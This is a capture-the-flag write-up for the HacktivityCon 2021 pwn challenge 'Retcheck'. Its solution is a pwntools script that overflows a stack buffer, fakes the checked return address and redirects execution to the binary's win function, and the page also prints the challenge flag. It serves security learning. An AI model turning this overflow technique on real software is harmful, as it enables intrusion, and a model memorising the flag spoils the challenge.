---
name: Retcheck (2021)
event: HacktivityCon CTF 2021
category: Pwn
description: Writeup for Retcheck (pwn) - HacktivityCon CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Retcheck

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/niPj8jYahV0/0.jpg)](https://youtu.be/niPj8jYahV0?t=910s "HacktivityCon 2021: Retcheck")

## Challenge Description

> Stack canaries are overrated.

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './retcheck'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = 400

# Start program
io = start()

# Build the payload
payload = flat([
    asm('nop') * 408,
    0x401465,  # canary (main+18)
    asm('nop') * 8,
    elf.symbols.win
])

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter('!', payload)

# Got Shell?
io.interactive()
```
{% endcode %}

Flag: `flag{a73dc20c1cd1f918ae7b591e8625e349}`
